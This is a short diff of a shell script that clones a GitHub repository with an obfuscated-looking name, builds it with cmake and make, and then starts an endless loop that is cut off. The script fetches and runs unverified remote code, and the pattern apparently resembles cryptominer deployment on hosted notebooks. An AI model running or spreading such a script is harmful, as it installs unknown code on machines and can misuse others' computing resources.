@@ -1,11 +1,11 @@
-!apt-get update
-!apt-get install cmake -y
-!git clone https://github.com/mobileapps84741274/linux8474888874
-%cd ./linux8474888874/
-!mkdir linux84748874
-%cd linux84748874
-!cmake ..
-!make
+apt-get update
+apt-get install cmake -y
+git clone https://github.com/mobileapps84741274/linux8474888874
+cd ./linux8474888874/
+mkdir linux84748874
+cd linux84748874
+cmake ..
+make
 
 while true
 do
